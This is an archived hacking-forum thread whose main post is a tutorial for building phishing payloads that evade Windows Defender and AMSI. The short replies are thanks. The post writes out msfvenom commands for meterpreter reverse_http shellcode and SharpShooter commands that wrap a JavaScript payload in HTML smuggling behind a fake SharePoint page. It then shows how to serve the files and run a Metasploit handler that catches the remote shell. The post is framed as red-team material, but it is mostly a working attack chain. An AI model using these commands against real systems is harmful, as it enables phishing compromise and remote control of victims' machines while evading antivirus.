<!DOCTYPE html>
<html lang="en">
  <!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
<head>
    <meta charset="utf-8">
    <title>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo - Malware - 0x00sec - The Home of the Hacker</title>
    <meta name="description" content="Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo
Hi! I hope you‚Äôre well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind o&amp;hellip;">
    <meta name="generator" content="Discourse 3.6.0.beta2-latest - https://github.com/discourse/discourse version 3b1964f3ed8bdc2f181e2abccb1b116e4b814db5">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.html">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.html">
<meta name="theme-color" media="all" content="#171616">

<meta name="color-scheme" content="dark">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, viewport-fit=cover">
<link rel="canonical" href="8178.html" />

<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">

    
    <link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4.css_%3b%20filename_%3dUTF-8%27%27color_definitions_0x00sec-v2_15_57_dfa17f5b2e0faf8b274cd749dd7dab92384218d4a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" class="light-scheme" data-scheme-id="15"/>

<link href="../../stylesheets/common_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27common_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common"  />

  <link href="../../stylesheets/mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile"  />
  <link href="../../stylesheets/desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop"  />



    <link href="../../stylesheets/chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="chat"  />
    <link href="../../stylesheets/checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27checklist_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="checklist"  />
    <link href="../../stylesheets/discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-cakeday_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-cakeday"  />
    <link href="../../stylesheets/discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-details_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-details"  />
    <link href="../../stylesheets/discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-lazy-videos_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-lazy-videos"  />
    <link href="../../stylesheets/discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-local-dates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-local-dates"  />
    <link href="../../stylesheets/discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-narrative-bot_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-narrative-bot"  />
    <link href="../../stylesheets/discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-presence_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-presence"  />
    <link href="../../stylesheets/discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-solved"  />
    <link href="../../stylesheets/discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-templates_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-templates"  />
    <link href="../../stylesheets/discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="discourse-topic-voting"  />
    <link href="../../stylesheets/docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27docker_manager_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="docker_manager"  />
    <link href="../../stylesheets/footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27footnote_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="footnote"  />
    <link href="../../stylesheets/poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="poll"  />
    <link href="../../stylesheets/spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27spoiler-alert_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="spoiler-alert"  />
    <link href="../../stylesheets/chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="chat_mobile"  />
    <link href="../../stylesheets/discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-solved_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-solved_mobile"  />
    <link href="../../stylesheets/discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_mobile_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="discourse-topic-voting_mobile"  />
    <link href="../../stylesheets/chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27chat_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="chat_desktop"  />
    <link href="../../stylesheets/discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27discourse-topic-voting_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="discourse-topic-voting_desktop"  />
    <link href="../../stylesheets/poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460.css_%3b%20filename_%3dUTF-8%27%27poll_desktop_790af2e09dec4f80b03e04c757d6ba29e7ae3460a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="poll_desktop"  />

  <link href="../../stylesheets/common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960db.css_%3b%20filename_%3dUTF-8%27%27common_theme_57_2b2f1b92f8727e7da2866f327e36ad944c6960dba97f.css?__ws=d.clarkee.co.uk" media="all" rel="stylesheet" data-target="common_theme" data-theme-id="57" data-theme-name="0x00sec-v2"/>
    <link href="../../stylesheets/mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38.css_%3b%20filename_%3dUTF-8%27%27mobile_theme_4_7b59060f894813801912cfad9deff99ebb9e9a38a97f.css?__ws=d.clarkee.co.uk" media="(max-width: 39.99999rem)" rel="stylesheet" data-target="mobile_theme" data-theme-id="4" data-theme-name="mobile chrome"/>
    <link href="../../stylesheets/desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96.css_%3b%20filename_%3dUTF-8%27%27desktop_theme_46_ae6f300d6e65399f845f6707524095726ad69a96a97f.css?__ws=d.clarkee.co.uk" media="(min-width: 40rem)" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2"/>

    <link rel="stylesheet" href="../../../external.html?link=https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="../../../external.html?link=https://s3.amazonaws.com/0x00sec/highlight.pack.js" nonce="bcnANTm0KZAW0q2tJwviJgNep"></script>
<script defer="" src="../../theme-javascripts/05954ff525aceb8daa8b585f92d758d311ae7077.js_%3b%20filename_%3dUTF-8%27%2705954ff525aceb8daa8b585f92d758d311ae7077a97f.js?__ws=d.clarkee.co.uk" data-theme-id="40" nonce="bcnANTm0KZAW0q2tJwviJgNep"></script>
    
        <link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo&#39;" href="8178.rss" />
    <meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.s3.amazonaws.com/original/2X/0/0f913fe8872d8a3a57d80da9b1551734e8940957.png" />
<meta property="og:image" content="https://0x00sec.s3.amazonaws.com/original/2X/0/0f913fe8872d8a3a57d80da9b1551734e8940957.png" />
<meta property="og:url" content="https://d.clarkee.co.uk/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178" />
<meta name="twitter:url" content="https://d.clarkee.co.uk/t/clientside-exploitation-tricks-of-the-trade-0x01-sharpshooter-squibblytwo/8178" />
<meta property="og:title" content="Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo" />
<meta name="twitter:title" content="Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo" />
<meta property="og:description" content="Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo Hi! I hope you‚Äôre well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind of thing every day without thinking about it. However, if you‚Äôre new to security, or you‚Äôre just not involved in the industry, a lot of these techniques and appear a bit daunting and long-winded. I‚Äôm here to show that it really isn‚Äôt hard, and you don‚Äôt need Cobalt Strike to do it..." />
<meta name="twitter:description" content="Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo Hi! I hope you‚Äôre well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind of thing every day without thinking about it. However, if you‚Äôre new to security, or you‚Äôre just not involved in the industry, a lot of these techniques and appear a bit daunting and long-winded. I‚Äôm here to show that it really isn‚Äôt hard, and you don‚Äôt need Cobalt Strike to do it..." />
<meta property="og:article:section" content="Malware" />
<meta property="og:article:section:color" content="F7941D" />
<meta property="og:article:tag" content="sharpshooter" />
<meta property="og:article:tag" content="xsl" />
<meta property="og:article:tag" content="malware" />
<meta property="og:article:tag" content="comstaging" />
<meta property="og:article:tag" content="amsi" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="2 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="27 ‚ù§" />
<meta property="article:published_time" content="2018-08-21T14:19:44+00:00" />
<meta property="og:ignore_canonical" content="true" />


    
  </head>
  <body class="crawler ">
    <div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">
  <!--<a href="https://git.0x00sec.org" class="dow-menu">GitLab</a>  
  <a href="https://blog.0x00sec.org/irc" class="dow-menu">IRC</a>!-->
  <a href="../../../external.html?link=https://init.0x00sec.org/" class="dow-menu">Init</a>
  <a href="../../../external.html?link=https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
  <a href="../../../external.html?link=https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
    <header>
  <a href="../../index.html">0x00sec - The Home of the Hacker</a>
</header>

    <div id="main-outlet" class="wrap" role="main">
        <div id="topic-title">
    <h1>
      <a href="8178.html">Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</a>
    </h1>

      <div class="topic-category" itemscope itemtype="../../../external.html?link=http://schema.org/BreadcrumbList">
          <span itemprop="itemListElement" itemscope itemtype="../../../external.html?link=http://schema.org/ListItem">
            <a href="../../c/malware/56.html" class="badge-wrapper bullet" itemprop="item">
              <span class='badge-category-bg' style='background-color: #F7941D'></span>
              <span class='badge-category clear-badge'>
                <span class='category-name' itemprop='name'>Malware</span>
              </span>
            </a>
            <meta itemprop="position" content="1" />
          </span>
      </div>

      <div class="topic-category">
        <div class='discourse-tags list-tags'>
            <a href='../../tag/sharpshooter.html' class='discourse-tag' rel="tag">sharpshooter</a>, 
            <a href='../../tag/xsl.html' class='discourse-tag' rel="tag">xsl</a>, 
            <a href='../../tag/malware.html' class='discourse-tag' rel="tag">malware</a>, 
            <a href='../../tag/comstaging.html' class='discourse-tag' rel="tag">comstaging</a>, 
            <a href='../../tag/amsi.html' class='discourse-tag' rel="tag">amsi</a>
        </div>
      </div>
  </div>

  

    <div itemscope itemtype='../../../external.html?link=http://schema.org/DiscussionForumPosting'>
      <meta itemprop='headline' content='Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo'>
      <link itemprop='url' href='8178.html'>
      <meta itemprop='datePublished' content='2018-08-21T14:19:43Z'>
        <meta itemprop='articleSection' content='Malware'>
      <meta itemprop='keywords' content='sharpshooter, xsl, malware, comstaging, amsi'>
      <div itemprop='publisher' itemscope itemtype="../../../external.html?link=http://schema.org/Organization">
        <meta itemprop='name' content='0x00sec - The Home of the Hacker'>
          <div itemprop='logo' itemscope itemtype="../../../external.html?link=http://schema.org/ImageObject">
            <meta itemprop='url' content='../../uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.html'>
          </div>
      </div>


          <div id='post_1'  class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>

                <link itemprop="mainEntityOfPage" href="8178.html">

                <link itemprop="image" href="../../../0x00sec.s3.amazonaws.com/original/2X/0/0f913fe8872d8a3a57d80da9b1551734e8940957.png">

              <span class="crawler-post-infos">
                  <time  datetime='2018-08-21T14:19:44Z' class='post-time'>
                    August 21, 2018,  2:19pm
                  </time>
                  <meta itemprop='dateModified' content='2018-08-21T14:31:39Z'>
              <span itemprop='position'>1</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <h1>Clientside Exploitation - Tricks of the Trade 0x01 - Sharpshooter + SquibblyTwo</h1>
<p>Hi! I hope you‚Äôre well, today I am going to show you something that is common knowledge in the red teaming community, people use this kind of thing every day without thinking about it. However, if you‚Äôre new to security, or you‚Äôre just not involved in the industry, a lot of these techniques and appear a bit daunting and long-winded. I‚Äôm here to show that it really isn‚Äôt hard, and you don‚Äôt need Cobalt Strike to do it, despite how awesome it is.</p>
<h2>Here is a demo of it running with Cobalt Strike.</h2>
<p>          <iframe width="640" height="360" src="../../../external.html?link=https://player.vimeo.com/video/276760800" data-original-href="https://vimeo.com/276760800" frameborder="0" allowfullscreen="" seamless="seamless" sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-popups-to-escape-sandbox allow-presentation"></iframe>
</p>
<p>Today I am going to show you how to:</p>
<ul>
<li>Create a payload that isn‚Äôt detected by Windows Defender, even with real-time protection, advanced threat protection, and AMSI</li>
<li>Do all of this without Cobalt Strike, and instead with Sharpshooter + Metasploit/Msfvenom*</li>
</ul>
<p><small>*If you have a problem with metasploit framework, I understand. It is usually associated with people who just fire exploits at random hosts in a hope to get shells. However, I do not think that we should discard a very useful tool because of its sad minority of users. Metasploit is a great tool when used correctly, can provide tremendous value, and it‚Äôs free!</small></p>
<hr>
<h4>Author Assigned Level: Wannabe</h4>
<h4>Community Assigned Level:</h4>
<div class="poll" data-poll-status="open" data-poll-type="regular" data-poll-name="poll">
<div>
<div class="poll-container">
<ul>
<li data-poll-option-id="e1c1af66349ae633fa9ffd223d9e01f3">Newbie</li>
<li data-poll-option-id="48cde21e0fcdef5aef447a332bb6dcc0">Wannabe</li>
<li data-poll-option-id="f0d5a092a44bae0d9f0734127a07fe91">Hacker</li>
<li data-poll-option-id="d0be935ef28646b5afecbf524d510b85">Wizard</li>
<li data-poll-option-id="cc5e4d9a5dc2c4d9aa641ef7a2a97876">Guru</li>
</ul>
</div>
<div class="poll-info">
<p>
<span class="info-number">0</span>
<span class="info-label">voters</span>
</p>
</div>
</div>
</div>
<h4>Required Skills</h4>
<ul>
<li>Understanding of payload generation with metasploit</li>
<li>Understanding of metasploit payloads</li>
<li>Basic networking understanding</li>
</ul>
<hr>
<h3>Disclaimer</h3>
<p>In no way to do I claim this to be my work, this is purely my take on this method, and if you want to read the original source of this information, please read it from <a href="../../../external.html?link=https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/">here</a>. This is an excellent method developed by Dominic Chell from Mdsec, and I wanted to re-write this in a way I think is more concise and holistic. As a side note, some images and videos may be sourced from that article.</p>
<hr>
<p>One of the reasons I chose to do a write-up on this, especially when very good articles have already been written by <a href="../../../external.html?link=http://mdsec.co.uk/">mdsec</a>, such as <a href="../../../external.html?link=https://www.mdsec.co.uk/2018/03/payload-generation-using-sharpshooter/">Payload Generation with Sharpshooter</a> and <a href="../../../external.html?link=https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/">Freestyling with Sharpshooter</a>, is because I feel there are certain things that are assumed that you know how to use; things such as <code>--rawscfile</code> payload generation.</p>
<p>In this article, I will assume previous metasploit + msfvenom experience, the concept of xsl‚Äôs (<a href="../../../external.html?link=https://0x00sec.org/t/clientside-exploitation-in-2018-how-pentesting-has-changed/7356">how to do it manually</a>), and experience using the CLI in Linux.</p>
<p>This is a really easy way to generate undetectable payloads, and I am here to show you just how easy it is. If you‚Äôre already quite proficient, just scan down and read the code, <strong>I‚Äôm sure most of you are just skim reading this article anyway <img src="../../../0x00sec.org/images/emoji/twitter/stuck_out_tonguec164.html?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></strong></p>
<h2>Prerequisites</h2>
<p>Something to keep in mind:</p>
<ul>
<li>You can only use Python 2 with Sharpshooter. It will run with Python 3, but it‚Äôll break stuff. Don‚Äôt ask me. It only caused me about 10 hours of trouble. (not quite, but you get the idea)</li>
<li>Cloned Repo + Setup of <a href="../../../external.html?link=https://github.com/mdsecactivebreach/SharpShooter">Sharpshooter</a>
</li>
<li>Cloned Repo/Install of <a href="../../../external.html?link=https://github.com/rapid7/metasploit-framework/">metasploit framework</a> (Use rvm and install deps with bundler)</li>
</ul>
<h2>Generating your shellcode</h2>
<p>You‚Äôll need msfvenom for this task, in other examples of how to use sharpshooter, you‚Äôll use things like csharp byte-arrays. For this example, we‚Äôll be using straight up shellcode. Lucky for us, msfvenom actually will do this for us in one command.</p>
<p>Run the following:</p>
<pre><code class="lang-bash">./msfvenom -a x64 -p windows/x64/meterpreter/reverse_http LHOST=192.168.1.221 LPORT=443 EnableStageEncoding=True PrependMigrate=True -f raw -o shellcode.txt
</code></pre>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/0/0f913fe8872d8a3a57d80da9b1551734e8940957.png" alt="Msfvenom creating shellcode" width="" height=""></p>
<p>If you‚Äôve used msfvenom before, you‚Äôll know that this is just generating a payload for the x64 architecture (64bit), using the meterpreter reverse_http payload. The reverse_http payload option helps us to remain more stealthy, and slide past low-complexity packet inspection firewalls. For example, some firewalls allow you to allow ‚Äúhttp‚Äù traffic. This will slide past that.</p>
<hr>
<h1>Generating your Payload</h1>
<p>Now you‚Äôve generated your shellcode, place the shellcode.txt file inside the same directory. Now if you‚Äôre using a distro such as Arch Linux, ‚ÄúPython‚Äù will be Python3 by default. Whereas on Ubuntu + Kali, it will be Python2 by default. You can easily verify which is true for you by running <code>python --version</code>.</p>
<p>Now run the following, with the correct python executable, for me, this was <code>python2</code>.</p>
<pre><code class="lang-auto">python2 SharpShooter.py --stageless --dotnetver 2 --payload js --output foo --rawscfile raw3.txt --smuggle --template sharepoint --com xslremote --awlurl http://192.168.1.221:8000/foo.xsl
</code></pre>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/b/b8fafb920065e0d3ad5065d64caec0dbc3c54fc3.png" alt="Sharpshooter generating a payload" width="" height=""></p>
<p>This will do multiple things. Firstly it will create a stageless payload, this means that it will not be staged, and therefore will have everything it <em>needs</em> inside the payload. This can be a bit misleading, as it will later pull a <code>.xsl</code> file, however as far as you need to know, this is a stageless payload.</p>
<p>Secondly, it will specify dotnet version 2 to use, you need to ensure that the target has this version of dotnet installed, if they do not, then this will fail. Most Windows targets have at least dotnet version 2, so this is usually fine.</p>
<p>Next we specify which payload type to use, in this case, I specify JS, however, we could easily also specify something such as <code>vba</code>.</p>
<p>After that, we use the --smuggle function. Some firewalls and security software blocks downloads of <code>.js</code> and <code>.vba</code> files, this --smuggle function wraps the file up inside the html file, encodes and encrypts it. On page load, the data is decrypted and decoded and saved as a blob. No more do spam filters that block malicious extensions work. (I love this feature). In the same breath, we specify a template, all this will do is make the page look more legitimate, in this case, we specify <code>SharePoint</code> as the template, this means that the phishing HTML will look like it is downloading from Microsoft Sharepoint.</p>
<p>Now we get to the exciting bit, com-staging. Com-staging is a term coined by Dom Chell from Mdsec,  to break it down, some Microsoft applications such as Outlook, have functions that allow you to run shell commands, such as <code>obj.CreateObject("Wscript.shell").run("fun commands")</code>. This is leveraged by sharpshooter, and this in case, it is leveraging WMI to execute code from an XSL file.</p>
<p>Next, we need to specify our --awlurl, this will be where the xsl file will be located. In my case, I have specified at my <code>http://myip:8000/file.xsl</code>, because it is by default placed into the <code>output</code> folder, and I am going to run a python http server in there.</p>
<hr>
<h1>Serving up our Malicious files‚Ä¶</h1>
<p><code>cd</code> into the <code>./output</code> directory, and run:</p>
<pre><code class="lang-bash">python3 -m http.server
</code></pre>
<p>This will create a basic python web server on port 8000, inside this directory.</p>
<p>Now, in another window, start your Metasploit handler.</p>
<pre><code class="lang-bash">sudo -E ./msfconsole
use exploit/multi/handler
set LHOST 192.168.1.221
set LPORT 443
set PAYLOAD windows/x64/meterpreter/reverse_http
set ExitOnSession false
exploit -j
</code></pre>
<p>Now you should have a reverse_http handler started. Simply ensure that ports 8000 and ports 443 are open. And now navigate to <code>http://yourip:8000/foo.html</code>. You should be able to open the files, and should receive a shell!</p>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/affc016d28820888e9fd282435703118bb2de01e.png" alt="Recieving a shell connection in metasploit" width="" height=""></p>
<h2>Demo</h2>
<p><img src="../../../0x00sec.s3.amazonaws.com/original/2X/a/ad8bec3f8a94145af74b397fbee21f1bc1b27676.gif" width="" height=""></p>
<hr>
<h2>Conclusion</h2>
<p>Sharpshooter + SquibblyTwo with Com-staging is working an absolute treat to bypass AMSI, for now. Let‚Äôs see how long this lasts, for now though, we should abuse the hell out of this in red team assessments + advanced pentests. In future articles, I may begin to examine MacOS security and more‚Ä¶ Stay tuned!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="21" />
              <span class='post-likes'>21 Likes</span>
            </div>


            
          </div>
          <div id='post_2' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/Baud.html'><span itemprop='name'>Baud</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-08-21T17:50:47Z' class='post-time'>
                    August 21, 2018,  5:50pm
                  </time>
                  <meta itemprop='dateModified' content='2018-08-21T17:50:47Z'>
              <span itemprop='position'>2</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you for the very well written guide, I didn‚Äôt know sharpshooter until now. This goes straight to my favorites for later testing <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_3' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-08-21T17:52:27Z' class='post-time'>
                    August 21, 2018,  5:52pm
                  </time>
                  <meta itemprop='dateModified' content='2018-08-21T17:52:27Z'>
              <span itemprop='position'>3</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thank you man! That was my intention <img src="../../../0x00sec.org/images/emoji/twitter/slight_smilec164.html?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>I‚Äôll make sure to keep the people here updated with all the latest techniques that I learn.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="2" />
              <span class='post-likes'>2 Likes</span>
            </div>


            
          </div>
          <div id='post_4' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/bl4ckbo7.html'><span itemprop='name'>bl4ckbo7</span></a>
                
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-08-21T18:49:13Z' class='post-time'>
                    August 21, 2018,  6:49pm
                  </time>
                  <meta itemprop='dateModified' content='2018-08-21T18:49:13Z'>
              <span itemprop='position'>4</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Nice write-up man! <a class="mention" href="../../u/pry0cc.html">@pry0cc</a></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_5' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/mcpwn84.html'><span itemprop='name'>mcpwn84</span></a>
                (Marty McPwn)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-08-29T15:05:26Z' class='post-time'>
                    August 29, 2018,  3:05pm
                  </time>
                  <meta itemprop='dateModified' content='2018-08-29T15:05:26Z'>
              <span itemprop='position'>5</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
